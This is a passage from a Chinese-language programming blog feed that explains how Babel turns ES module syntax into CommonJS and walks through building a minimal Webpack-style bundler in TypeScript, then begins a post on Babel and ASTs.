class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="built_in">exports</span>, <span class="string">&quot;__esModule&quot;</span>, &#123;<span class="attr">value</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"><span class="built_in">exports</span>[<span class="string">&quot;default&quot;</span>] = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> _b = <span class="title function_">_interopRequireDefault</span>(<span class="built_in">require</span>(<span class="string">&quot;./b.js&quot;</span>)); <span class="comment">// 细节 1</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_interopRequireDefault</span>(<span class="params">obj</span>) &#123; <span class="comment">// 细节 1</span></span><br><span class="line">   <span class="keyword">return</span> obj &amp;&amp; obj.<span class="property">__esModule</span> ? obj : &#123; <span class="string">&quot;default&quot;</span>: obj &#125;; <span class="comment">// 细节 1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  <span class="attr">getB</span>: <span class="keyword">function</span> <span class="title function_">getB</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _b[<span class="string">&quot;default&quot;</span>].<span class="property">value</span> + <span class="string">&#x27; from a.js&#x27;</span>; <span class="comment">// 细节 1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> _default = a; <span class="comment">// 细节 2</span></span><br><span class="line"><span class="built_in">exports</span>[<span class="string">&quot;default&quot;</span>] = _default; <span class="comment">// 细节 2</span></span><br></pre></td></tr></table></figure><blockquote><p>第一行 <code>Object.defineProperty(exports, &quot;__esModule&quot;, &#123;value: true&#125;);</code> 其实等价于 <code>exports[&#39;__esModule&#39;] = true</code></p><ul><li>给当前模块添加 __esModule: true 属性，方便跟 CommonJS 模块区分开</li><li>那为什么不直接用 exports.__esModule = true 非要装隔壁？</li><li>其实可以用<a href="https://github.com/babel/babel/blob/e498bee10f0123bb208baa228ce6417542a2c3c4/packages/babel-helper-module-transforms/src/index.js#L215">选项</a>来切换的，两种区别不大，上面的写法功能更强，exports.__esModule 兼容性更好</li></ul></blockquote><blockquote><p>第二行 <code>exports[&#39;default&#39;] = void 0;</code></p><ul><li>void 0 等价于 undefined，来JSer 的常用过时技巧</li><li>这句话是为了强制清空 exports['default'] 的值</li><li>为什么要清空？目前暂时不理解，可能是有些特殊情况我现在没有想到</li></ul></blockquote><blockquote><p>第三行 <code>import b from &#39;./b.js&#39;</code> 变成了 <code>var _b = _interopRequireDefault(require(&quot;./b.js&quot;))</code>，<code>b.value</code> 变成了 <code>_b[&#39;default&#39;].value</code></p><ul><li>_interopRequireDefault 这个函数在做什么，其实就是一句话 <code>obj &amp;&amp; obj.__esModule ? obj : &#123; &quot;default&quot;: obj &#125;</code> ，看你是不是 es 模块，如果是就直接导出(因为 es 模块有默认导出)，如果不是就给你加一个默认导出(CommonJS 模块没有默认导出，加上方便兼容)</li><li>其他 _interop 开头的函数大多为了兼容旧代码</li></ul></blockquote><blockquote><p>细节 2 <code>export default a</code> 变成了 <code>var _default = a; exports[&quot;default&quot;] = _default;</code>，简化一下就是 <code>exports[&quot;default&quot;] = a</code></p><ul><li>并不看不出来这样写的作用</li><li>如果不是默认导出，那么代码会是什么样子呢？</li><li><code>export const x = &#39;x&#39;;</code> 会变成 <code>var x = &#39;x&#39;; exports.x = x</code></li></ul></blockquote><h5 id="以上我们可以知道-babel-core-会把-import-关键字变成-require-函数，export-关键字会变成-exports-对象"><a href="#以上我们可以知道-babel-core-会把-import-关键字变成-require-函数，export-关键字会变成-exports-对象" class="headerlink" title="以上我们可以知道 @babel/core 会把 import 关键字变成 require 函数，export 关键字会变成 exports 对象"></a>以上我们可以知道 <code>@babel/core</code> 会把 import 关键字变成 require 函数，export 关键字会变成 exports 对象</h5><blockquote><p>本质：ESModule 语法变成了 CommonJS 规则<br>但我们还没有发现 require 函数是怎么写的，目前先假设 require 已经写好了</p></blockquote><h1 id="把多个文件打包成一个"><a href="#把多个文件打包成一个" class="headerlink" title="把多个文件打包成一个"></a>把多个文件打包成一个</h1><h2 id="打包成一个什么样的文件？"><a href="#打包成一个什么样的文件？" class="headerlink" title="打包成一个什么样的文件？"></a>打包成一个什么样的文件？</h2><blockquote><p>肯定<strong>包含</strong>了所有模块，然后能<strong>执行</strong>所有模块</p></blockquote><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var depRelation = [ </span><br><span class="line">  <span class="built_in">&#123;key</span>: <span class="string">&#x27;index.js&#x27;</span>, deps: [<span class="string">&#x27;a.js&#x27;</span>, <span class="string">&#x27;b.js&#x27;</span>], code: <span class="keyword">function</span>... &#125;,</span><br><span class="line">  <span class="built_in">&#123;key</span>: <span class="string">&#x27;a.js&#x27;</span>, deps: [<span class="string">&#x27;b.js&#x27;</span>], code: <span class="keyword">function</span>... &#125;,</span><br><span class="line">  <span class="built_in">&#123;key</span>: <span class="string">&#x27;b.js&#x27;</span>, deps: [<span class="string">&#x27;a.js&#x27;</span>], code: <span class="keyword">function</span>... &#125;</span><br><span class="line">] </span><br><span class="line"></span><br><span class="line">execute(depRelation[<span class="number">0</span>]<span class="built_in">.key</span>) // 执行入口文件</span><br><span class="line"><span class="keyword">function</span> execute ......</span><br></pre></td></tr></table></figure><blockquote><p>为什么把 depRelation 从对象改为数组？<br>因为我们需要知道入口文件，数组的第一项就是入口，而对象没有第一项的概念</p></blockquote><h3 id="现在有三个问题还没解决"><a href="#现在有三个问题还没解决" class="headerlink" title="现在有三个问题还没解决"></a>现在有三个问题还没解决</h3><blockquote><p>1、depRelation 是对象，需要编程一个数组<br>2、code 是字符串，需要变成一个函数<br>3、execute 函数待完善</p></blockquote><h5 id="问题-1"><a href="#问题-1" class="headerlink" title="问题 1"></a>问题 1</h5><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&quot;@babel/parser&quot;</span></span><br><span class="line"><span class="keyword">import</span> traverse <span class="keyword">from</span> <span class="string">&quot;@babel/traverse&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; readFileSync &#125; <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; resolve, relative, dirname &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> babel <span class="keyword">from</span> <span class="string">&#x27;@babel/core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置根目录</span></span><br><span class="line"><span class="keyword">const</span> projectRoot = <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;project_1&#x27;</span>)</span><br><span class="line"><span class="comment">// 类型声明</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DepRelation</span> = &#123; <span class="attr">key</span>: <span class="built_in">string</span>, <span class="attr">deps</span>: <span class="built_in">string</span>[], <span class="attr">code</span>: <span class="built_in">string</span> &#125;[] <span class="comment">// 变动！！！</span></span><br><span class="line"><span class="comment">// 初始化一个空的 depRelation，用于收集依赖</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">depRelation</span>: <span class="title class_">DepRelation</span> = [] <span class="comment">// 变动！！！</span></span><br><span class="line"><span class="comment">// 将入口文件的绝对路径传入函数，如 D:\demo\fixture_1\index.js</span></span><br><span class="line"><span class="title function_">collectCodeAndDeps</span>(<span class="title function_">resolve</span>(projectRoot, <span class="string">&#x27;index.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(depRelation)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">collectCodeAndDeps</span>(<span class="params">filepath: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> key = <span class="title function_">getProjectPath</span>(filepath) <span class="comment">// 文件的项目路径，如 index.js</span></span><br><span class="line">  <span class="keyword">if</span> (depRelation.<span class="title function_">find</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">key</span> === key)) &#123; <span class="comment">// 变动！！！</span></span><br><span class="line">    <span class="comment">// 注意，重复依赖不一定是循环依赖</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 获取文件内容，将内容放至 depRelation</span></span><br><span class="line">  <span class="keyword">const</span> code = <span class="title function_">readFileSync</span>(filepath).<span class="title function_">toString</span>()</span><br><span class="line">  <span class="keyword">const</span> &#123; <span class="attr">code</span>: es5Code &#125; = babel.<span class="title function_">transform</span>(code, &#123;</span><br><span class="line">    <span class="attr">presets</span>: [<span class="string">&#x27;@babel/preset-env&#x27;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 初始化 depRelation[key]</span></span><br><span class="line">  <span class="keyword">const</span> item = &#123; key, <span class="attr">deps</span>: [], <span class="attr">code</span>: es5Code &#125; <span class="comment">// 变动！！！</span></span><br><span class="line">  depRelation.<span class="title function_">push</span>(item) <span class="comment">// 变动！！！</span></span><br><span class="line">  <span class="comment">// 将代码转为 AST</span></span><br><span class="line">  <span class="keyword">const</span> ast = <span class="title function_">parse</span>(code, &#123; <span class="attr">sourceType</span>: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">  <span class="comment">// 分析文件依赖，将内容放至 depRelation</span></span><br><span class="line">  <span class="title function_">traverse</span>(ast, &#123;</span><br><span class="line">    <span class="attr">enter</span>: <span class="function"><span class="params">path</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&#x27;ImportDeclaration&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// path.node.source.value 往往是一个相对路径，如 ./a.js，需要先把它转为一个绝对路径</span></span><br><span class="line">        <span class="keyword">const</span> depAbsolutePath = <span class="title function_">resolve</span>(<span class="title function_">dirname</span>(filepath), path.<span class="property">node</span>.<span class="property">source</span>.<span class="property">value</span>)</span><br><span class="line">        <span class="comment">// 然后转为项目路径</span></span><br><span class="line">        <span class="keyword">const</span> depProjectPath = <span class="title function_">getProjectPath</span>(depAbsolutePath)</span><br><span class="line">        <span class="comment">// 把依赖写进 depRelation</span></span><br><span class="line">        item.<span class="property">deps</span>.<span class="title function_">push</span>(depProjectPath) <span class="comment">// 变动！！！</span></span><br><span class="line">        <span class="title function_">collectCodeAndDeps</span>(depAbsolutePath)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件相对于根目录的相对路径</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getProjectPath</span>(<span class="params">path: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">relative</span>(projectRoot, path).<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="问题-2"><a href="#问题-2" class="headerlink" title="问题 2"></a>问题 2</h5><p>把 code 由字符串改为函数</p><ul><li>步骤<br>1、在 code 字符串外面包一个 <code>function(require, module, exports)&#123;...&#125;</code>（/<em>reqire，module，export 这三个参数是 CommonJS 2 规范规定的</em>/）<br>2、把 code 写到文件里，引号不会出现在文件中<br>3、不要用 eval，我们不需要执行这个函数，只需要写进文件当中就好了</li><li>举例<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">code = `</span><br><span class="line">  var b = require(&#x27;./b.js)</span><br><span class="line">  exports.default = &#x27;a&#x27;</span><br><span class="line">`</span><br><span class="line">code2 = `</span><br><span class="line">  function(require, module, exports) &#123;</span><br><span class="line">    $&#123;code&#125;</span><br><span class="line">  &#125;</span><br><span class="line">` </span><br></pre></td></tr></table></figure><blockquote><p>然后把 <code>code: $&#123;code2&#125;</code> 写入最终文件中<br>最终文件里的 code 就是函数了<br>更加详细的栗子🌰：比如 <code>writeFileSync(&#39;hello.txt&#39;, &#39;你好&#39;)</code>，那么文件中将出现 <code>你好</code> 两个字，但是如果我们这么写 <code>writeFileSync(&#39;hello.txt&#39;, &#39;&quot;你好&quot;&#39;)</code>，那么文件中将出现 <code>&quot;你好&quot;</code>。</p></blockquote></li></ul><h3 id="完善-execute-函数（主体思路）"><a href="#完善-execute-函数（主体思路）" class="headerlink" title="完善 execute 函数（主体思路）"></a>完善 execute 函数（主体思路）</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const modules = &#123;&#125; // modules 用于缓存所有模块<span class="keyword">function</span> execute<span class="built_in">(key</span>) &#123; </span><br><span class="line">  <span class="keyword">if</span> (modules<span class="built_in">[key</span>]) &#123; <span class="keyword">return</span> modules<span class="built_in">[key</span>] &#125;</span><br><span class="line">  var <span class="type">item</span> = depRelation.find(i =&gt; i<span class="built_in">.key</span> ===<span class="built_in"> key</span>)</span><br><span class="line">  var require = <span class="built_in">(path</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> execute(pathToKey<span class="built_in">(path</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  modules<span class="built_in">[key</span>] = &#123; __esModule:<span class="built_in"> true</span> &#125; // modules[<span class="string">&#x27;a.js&#x27;</span>]</span><br><span class="line">  var <span class="keyword">module</span> = &#123; exports: modules<span class="built_in">[key</span>] &#125;</span><br><span class="line">  <span class="type">item</span>.code(require, <span class="keyword">module</span>, <span class="keyword">module</span>.exports) </span><br><span class="line">  <span class="keyword">return</span> modules.exports</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="以上，我们就解决了上面的三个问题，下面就是我们最终的文件的主要内容（目前是手写的，之后将用程序生成）"><a href="#以上，我们就解决了上面的三个问题，下面就是我们最终的文件的主要内容（目前是手写的，之后将用程序生成）" class="headerlink" title="以上，我们就解决了上面的三个问题，下面就是我们最终的文件的主要内容（目前是手写的，之后将用程序生成）"></a>以上，我们就解决了上面的三个问题，下面就是我们最终的文件的主要内容（目前是手写的，之后将用程序生成）</h5><p><img src="/Blog/2021/03/03/javascript/Webpack%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/index/img_2.png"></p><blockquote><p>我们直接用 node 运行这个文件</p></blockquote><p><img src="/Blog/2021/03/03/javascript/Webpack%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/index/img_3.png"></p><blockquote><p>和之前的未转译的代码(<br><code>import a from &#39;./a.js&#39;; import b from &#39;./b.js&#39;; console.log(a.getB()); console.log(b.getA());</code><br>)一模一样(这就对了)，区别就是1、语法不同2、之前需要引入其他文件，现在 dist 不需要引入其他文件，因为我们把所有内容写进了一个文件，这就是 bundle，</p></blockquote><h3 id="但，怎么得到最终文件？"><a href="#但，怎么得到最终文件？" class="headerlink" title="但，怎么得到最终文件？"></a>但，怎么得到最终文件？</h3><blockquote><p>答案很简单：拼凑出字符串，然后写进文件<br>var dist = ""<br>dist += content<br>writeFileSync('dist.js', dist)</p></blockquote><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">// 请确保你的 Node 版本大于等于 <span class="number">14</span></span><br><span class="line">// 请先运行 yarn 或 npm i 来安装依赖</span><br><span class="line">// 然后使用 <span class="type">node</span> -r ts-node/register 文件路径 来运行，</span><br><span class="line">// 如果需要调试，可以加一个选项 --inspect-brk，再打开 Chrome 开发者工具，点击 Node 图标即可调试</span><br><span class="line"><span class="keyword">import</span> &#123; parse &#125; from <span class="string">&quot;@babel/parser&quot;</span></span><br><span class="line"><span class="keyword">import</span> traverse from <span class="string">&quot;@babel/traverse&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; writeFileSync, readFileSync &#125; from <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; resolve, relative, dirname &#125; from <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> babel from <span class="string">&#x27;@babel/core&#x27;</span></span><br><span class="line"></span><br><span class="line">// 设置根目录</span><br><span class="line">const projectRoot = resolve(__dirname, <span class="string">&#x27;project_1&#x27;</span>)</span><br><span class="line">// 类型声明</span><br><span class="line">type DepRelation = &#123;<span class="built_in"> key</span>:<span class="built_in"> string</span>, deps:<span class="built_in"> string</span>[], code:<span class="built_in"> string</span> &#125;[]</span><br><span class="line">// 初始化一个空的 depRelation，用于收集依赖</span><br><span class="line">const depRelation: DepRelation = [] // 数组！</span><br><span class="line"></span><br><span class="line">// 将入口文件的绝对路径传入函数，如 D:\demo\fixture_1\index.js</span><br><span class="line">collectCodeAndDeps(resolve(projectRoot, <span class="string">&#x27;index.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line">writeFileSync(<span class="string">&#x27;dist_2.js&#x27;</span>, generateCode())</span><br><span class="line">console.log(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> generateCode() &#123;</span><br><span class="line">  <span class="keyword">let</span> code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  code += <span class="string">&#x27;var depRelation = [&#x27;</span> + depRelation.<span class="keyword">map</span>(<span class="type">item</span> =&gt; &#123;</span><br><span class="line">    const &#123;<span class="built_in"> key</span>, deps, code &#125; = <span class="type">item</span></span><br><span class="line">    <span class="keyword">return</span> `&#123;</span><br><span class="line">     <span class="built_in"> key</span>: $&#123;JSON.stringify<span class="built_in">(key</span>)&#125;, </span><br><span class="line">      deps: $&#123;JSON.stringify(deps)&#125;,</span><br><span class="line">      code: <span class="keyword">function</span>(require, <span class="keyword">module</span>, exports)&#123;</span><br><span class="line">        $&#123;code&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;`</span><br><span class="line">  &#125;).join(<span class="string">&#x27;,&#x27;</span>) + <span class="string">&#x27;];\n&#x27;</span></span><br><span class="line">  code += <span class="string">&#x27;var modules = &#123;&#125;;\n&#x27;</span></span><br><span class="line">  code += `execute(depRelation[<span class="number">0</span>]<span class="built_in">.key</span>)\n`</span><br><span class="line">  code += `</span><br><span class="line">  <span class="keyword">function</span> execute<span class="built_in">(key</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (modules<span class="built_in">[key</span>]) &#123; <span class="keyword">return</span> modules<span class="built_in">[key</span>] &#125;</span><br><span class="line">    var <span class="type">item</span> = depRelation.find(i =&gt; i<span class="built_in">.key</span> ===<span class="built_in"> key</span>)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="type">item</span>) &#123; throw new Error(\`\$&#123;<span class="type">item</span>&#125; <span class="literal">is</span><span class="built_in"> not</span> found\`) &#125;</span><br><span class="line">    var pathToKey = <span class="built_in">(path</span>) =&gt; &#123;</span><br><span class="line">      var dirname =<span class="built_in"> key</span><span class="built_in">.substring</span>(<span class="number">0</span>,<span class="built_in"> key</span>.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>)</span><br><span class="line">      var projectPath = (dirname +<span class="built_in"> path</span>)<span class="built_in">.replace</span>(\/\\.\\\/\/g, <span class="string">&#x27;&#x27;</span>)<span class="built_in">.replace</span>(\/\\\/\\\/\/, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> projectPath</span><br><span class="line">    &#125;</span><br><span class="line">    var require = <span class="built_in">(path</span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> execute(pathToKey<span class="built_in">(path</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    modules<span class="built_in">[key</span>] = &#123; __esModule:<span class="built_in"> true</span> &#125;</span><br><span class="line">    var <span class="keyword">module</span> = &#123; exports: modules<span class="built_in">[key</span>] &#125;</span><br><span class="line">    <span class="type">item</span>.code(require, <span class="keyword">module</span>, <span class="keyword">module</span>.exports)</span><br><span class="line">    <span class="keyword">return</span> modules<span class="built_in">[key</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  `</span><br><span class="line">  <span class="keyword">return</span> code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> collectCodeAndDeps(filepath:<span class="built_in"> string</span>) &#123;</span><br><span class="line">  const<span class="built_in"> key</span> = getProjectPath(filepath) // 文件的项目路径，如 index.js</span><br><span class="line">  <span class="keyword">if</span> (depRelation.find(<span class="type">item</span> =&gt; <span class="type">item</span><span class="built_in">.key</span> ===<span class="built_in"> key</span>)) &#123;</span><br><span class="line">    // 注意，重复依赖不一定是循环依赖</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  // 获取文件内容，将内容放至 depRelation</span><br><span class="line">  const code = readFileSync(filepath).toString()</span><br><span class="line">  const &#123; code: es5Code &#125; = babel<span class="built_in">.transform</span>(code, &#123;</span><br><span class="line">    presets: [<span class="string">&#x27;@babel/preset-env&#x27;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line">  // 初始化 depRelation<span class="built_in">[key</span>]</span><br><span class="line">  const <span class="type">item</span> = &#123;<span class="built_in"> key</span>, deps: [], code: es5Code &#125;</span><br><span class="line">  depRelation.push(<span class="type">item</span>)</span><br><span class="line">  // 将代码转为 AST</span><br><span class="line">  const ast = parse(code, &#123; sourceType: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">  // 分析文件依赖，将内容放至 depRelation</span><br><span class="line">  traverse(ast, &#123;</span><br><span class="line">    enter:<span class="built_in"> path</span> =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">(path</span>.<span class="type">node</span>.type === <span class="string">&#x27;ImportDeclaration&#x27;</span>) &#123;</span><br><span class="line">        //<span class="built_in"> path</span>.<span class="type">node</span>.source.<span class="keyword">value</span> 往往是一个相对路径，如 ./a.js，需要先把它转为一个绝对路径</span><br><span class="line">        const depAbsolutePath = resolve(dirname(filepath),<span class="built_in"> path</span>.<span class="type">node</span>.source.<span class="keyword">value</span>)</span><br><span class="line">        // 然后转为项目路径</span><br><span class="line">        const depProjectPath = getProjectPath(depAbsolutePath)</span><br><span class="line">        // 把依赖写进 depRelation</span><br><span class="line">        <span class="type">item</span>.deps.push(depProjectPath)</span><br><span class="line">        collectCodeAndDeps(depAbsolutePath)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">// 获取文件相对于根目录的相对路径</span><br><span class="line"><span class="keyword">function</span> getProjectPath<span class="built_in">(path</span>:<span class="built_in"> string</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> relative(projectRoot,<span class="built_in"> path</span>)<span class="built_in">.replace</span>(/\\/g, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>至此我们实现了最简易的打包器，这就是webpack 就核心的功能，但是目前还有很多问题，webpack 是强大的打包工具，我们有很多的重复，而且 webpack 只能诸多类型的文件（通过loader），我们只支持 js 文件，还有 webpack 支持配置文件（如：入口文件，变量....），目前只是可以理解 webpack 的核心原理。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AST、Babel、依赖</title>
      <link href="/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/"/>
      <url>/Blog/2021/03/02/javascript/AST%E3%80%81Babel%E3%80%81%E4%BE%9D%E8%B5%96/index/</url>
      
        <content type="html"><![CDATA[<h1 id="babel-与-AST"><a href="#babel-与-AST" class="headerlink" title="babel 与 AST"></a>babel 与 AST</h1><h2 id="先从Babel-说起"><a href="#先从Babel-说起" class="headerlink" title="先从Babel 说起"></a>先从Babel 说起</h2><ul><li><strong>babel 的原理</strong><br>1、parse：把代码 code 变成 AST<br>2、traverse：遍历 AST 进行修改<br>3、generate：把 AST 变成代码 code2<br>即：code – (1) - &gt;  ast – (2) - &gt; ast2 – (3) - &gt; code2</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&#x27;@babel/parser&#x27;</span></span><br><span class="line"><span class="keyword">import</span> traverse <span class="keyword">from</span> <span class="string">&#x27;@babel/traverse&#x27;</span></span><br><span class="line"><span class="keyword">import</span> generator <span class="keyword">from</span> <span class="string">&#x27;@babel/generator&#x27;</span></span><br><span class="line"></span><br><span class="line">const <span class="keyword">code</span> = `<span class="keyword">let</span> a = <span class="string">&#x27;a&#x27;</span>; <span class="keyword">let</span> b = <span class="string">&#x27;b&#x27;</span>`</span><br><span class="line">const ast = parse(<span class="keyword">code</span>, &#123; sourceType: <span class="string">&#x27;module&#x27;</span> &#125;)</span><br><span class="line">console.log(ast)</span><br></pre></td></tr></table></figure><blockquote><p>运行 <code>node -r ts-node/register --inspect-brk let_to_var.ts</code>，用浏览器的控制台打开(<code>--inspect-brk</code>)，点击 node 图标开始调试</p></blockquote><p><img 